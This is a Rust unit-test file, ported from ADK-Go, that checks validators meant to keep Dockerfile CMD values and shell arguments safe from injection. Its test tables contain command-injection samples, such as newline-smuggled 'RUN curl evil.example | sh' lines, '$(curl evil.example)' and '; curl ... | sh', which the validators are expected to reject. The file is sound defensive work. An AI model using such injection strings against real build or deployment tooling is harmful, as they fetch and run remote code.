// Copyright 2026 Chris Olson
// Portions derived from ADK-Go (https://github.com/google/adk-go), Copyright 2026 Google LLC.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//! Port of ADK-Go `internal/cli/util/text_helpers_test.go`.
//!
//! The checks take bytes, as Go's take a Go string, so the invalid-UTF-8 cases are written
//! as byte strings; Go's `json.Unmarshal` of the exec-form `CMD` line is `serde_json`'s
//! (both reject raw control bytes and decode the accepted values identically).

use crate::util::{validate_dockerfile_safe, validate_shell_arg_safe};

#[test]
fn test_validate_dockerfile_safe() {
    let tests: &[(&str, &[u8], bool)] = &[
        ("plain identifier", b"myserver", false),
        (
            "path with slashes and dots",
            b"cmd/quickstart/main.go",
            false,
        ),
        ("url", b"http://127.0.0.1:8081", false),
        ("empty string", b"", false),
        (
            "newline breaks out of the current instruction",
            b"x\nRUN curl evil.example | sh\n#",
            true,
        ),
        ("carriage return", b"x\rRUN curl evil.example | sh", true),
        (
            "double quote breaks out of a CMD JSON-array string",
            br#"x", "extra"]"#,
            true,
        ),
        ("backtick", b"x`whoami`", true),
        ("NUL byte", b"x\x00y", true),
        // A backslash keeps the CMD array parseable but silently changes the decoded
        // argument, so "http://x\ny" would reach the container with a real newline in it.
        (
            "backslash escape decodes to a different value",
            br"http://x\ny",
            true,
        ),
        // A lone backslash instead makes the array unparseable, and Docker answers an
        // unparseable exec form by rerunning it as shell form.
        ("trailing backslash breaks CMD JSON", br"http://x\", true),
        ("tab is a control byte", b"x\ty", true),
        ("escape byte", b"x\x1by", true),
        // Non-ASCII is fine here: it cannot terminate a JSON string.
        ("non-ASCII", "http://café.example".as_bytes(), false),
        // Invalid UTF-8 keeps the array parseable, but the Dockerfile parser and the JSON
        // decoder both turn the byte into U+FFFD, so the container receives a value nobody
        // wrote.
        (
            "invalid UTF-8 does not survive to the container",
            b"http://x\xffy",
            true,
        ),
    ];
    for (name, value, want_err) in tests {
        let err = validate_dockerfile_safe(value, "test value");
        assert_eq!(
            err.is_err(),
            *want_err,
            "{name}: ValidateDockerfileSafe({:?}) error = {err:?}, wantErr {want_err}",
            String::from_utf8_lossy(value)
        );
    }
}

#[test]
fn test_validate_shell_arg_safe() {
    let tests: &[(&str, &[u8], bool)] = &[
        ("plain identifier", b"myserver", false),
        (
            "path with slashes and dots",
            b"cmd/quickstart/main.go",
            false,
        ),
        ("empty string", b"", false),
        (
            "semicolon command separator",
            b"main.go; curl evil.example | sh #",
            true,
        ),
        ("pipe to shell", b"main.go | sh", true),
        (
            "ampersand background/chain",
            b"main.go && curl evil.example",
            true,
        ),
        ("command substitution", b"$(curl evil.example)", true),
        (
            "backtick command substitution",
            b"`curl evil.example`",
            true,
        ),
        ("space", b"main go", true),
        ("newline", b"x\nRUN curl evil.example | sh\n#", true),
        ("double quote", br#"x""#, true),
        ("backslash", br"x\y", true),
        (
            "url is rejected (not a path)",
            b"http://127.0.0.1:8081",
            true,
        ),
        // Non-ASCII is admitted: every byte of a multi-byte UTF-8 rune is >= 0x80, so none
        // of them can be a shell metacharacter.
        ("non-ASCII filename", "agenté".as_bytes(), false),
        (
            "non-ASCII directory component",
            "agentes/café/main.go".as_bytes(),
            false,
        ),
        ("non-Latin script", "агент".as_bytes(), false),
        // A supplementary-plane rune is four bytes rather than two or three.
        ("supplementary-plane rune", "agent😀".as_bytes(), false),
        // A raw 0xff is not a metacharacter, but it never deployed either.
        ("invalid UTF-8", b"agent\xff", true),
    ];
    for (name, value, want_err) in tests {
        let err = validate_shell_arg_safe(value, "test value");
        assert_eq!(
            err.is_err(),
            *want_err,
            "{name}: ValidateShellArgSafe({:?}) error = {err:?}, wantErr {want_err}",
            String::from_utf8_lossy(value)
        );
    }
}

/// Go `cmdArgs`: parses the exec-form CMD line cloudrun.go emits, with `value` interpolated
/// as the `--a2a_agent_url` argument.
fn cmd_args(value: &str) -> Result<Vec<String>, serde_json::Error> {
    serde_json::from_str(&format!(
        r#"["/app/main", "web", "--a2a_agent_url", "{value}"]"#
    ))
}

/// Every value the check accepts leaves the generated exec-form CMD parseable as a JSON
/// array and survives the parse unchanged.
#[test]
fn test_validate_dockerfile_safe_accepted_values_keep_cmd_parseable() {
    // Every single byte, so that no control byte, escape character or invalid UTF-8 byte
    // slips through unnoticed.
    for b in 0u8..=0xff {
        let mut value = b"http://x".to_vec();
        value.push(b);
        value.push(b'y');
        if validate_dockerfile_safe(&value, "test value").is_err() {
            continue;
        }
        // Accepted values are valid UTF-8 (the check rejects anything else).
        let value = String::from_utf8(value).unwrap();
        match cmd_args(&value) {
            Err(err) => {
                panic!("byte 0x{b:02x} is accepted but makes the CMD line unparseable: {err}")
            }
            Ok(args) => assert_eq!(
                args.last(),
                Some(&value),
                "byte 0x{b:02x} is accepted but decodes differently"
            ),
        }
    }

    // Every valid rune, up to utf8.MaxRune, as the valid UTF-8 a flag value carries.
    for r in (0..=0x10_ffffu32).filter_map(char::from_u32) {
        let value = format!("http://x{r}y");
        if validate_dockerfile_safe(&value, "test value").is_err() {
            continue;
        }
        match cmd_args(&value) {
            Err(err) => panic!(
                "rune U+{:04X} is accepted but makes the CMD line unparseable: {err}",
                r as u32
            ),
            Ok(args) => assert_eq!(
                args.last(),
                Some(&value),
                "rune U+{:04X} is accepted but decodes differently",
                r as u32
            ),
        }
    }
}

/// The allow-list: nothing outside the intended ASCII class is accepted, no valid non-ASCII
/// rune is rejected, and a byte >= 0x80 outside a valid rune is rejected.
#[test]
fn test_validate_shell_arg_safe_byte_class() {
    const ALLOWED_ASCII: &str =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_./-";

    for b in 0u8..0x80 {
        let accepted = validate_shell_arg_safe([b], "test value").is_ok();
        let want = ALLOWED_ASCII.as_bytes().contains(&b);
        assert_eq!(
            accepted, want,
            "byte 0x{b:02x} accepted = {accepted}, want {want}"
        );
    }

    for r in (0x80..=0x10_ffffu32).filter_map(char::from_u32) {
        let value = format!("agent{r}");
        if let Err(err) = validate_shell_arg_safe(&value, "test value") {
            panic!("rune U+{:04X} rejected: {err}", r as u32);
        }
    }

    for b in 0x80u8..=0xff {
        let mut value = b"agent".to_vec();
        value.push(b);
        assert!(
            validate_shell_arg_safe(&value, "test value").is_err(),
            "lone byte 0x{b:02x} accepted, want rejected: it is not part of a valid rune"
        );
    }
}
